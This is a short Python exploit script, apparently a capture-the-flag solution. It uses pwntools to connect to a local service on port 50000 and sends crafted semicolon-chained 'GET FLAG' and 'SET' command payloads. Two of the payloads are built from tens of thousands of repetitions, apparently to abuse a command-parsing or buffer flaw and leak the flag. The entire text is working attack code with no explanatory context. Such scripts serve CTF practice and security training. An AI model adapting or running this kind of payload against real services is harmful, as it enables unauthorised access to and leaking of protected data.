#!/usr/bin/env python3

from pwn import *

HOST = 'localhost'
PORT = 50000

MAX_LINE = 1_000_000

io = remote(HOST, PORT)

N = (int(MAX_LINE) - 100) // 30
payload0 = "GET FLAG"
payload1 = "GET FLAG" + "".join(f";SET {i:05d}=" for i in range(N))
payload2 = f"GET FLAG;SET {0:05d}=" + "_____{0:05d}="*(N-1) + ";SET 00000"

io.recvline_contains(b'Commands are separated by newline or semicolon')

io.sendline(payload0.encode())
io.sendline(payload1.encode())
io.sendline(payload2.encode())
print(io.recvall(timeout=1).decode())
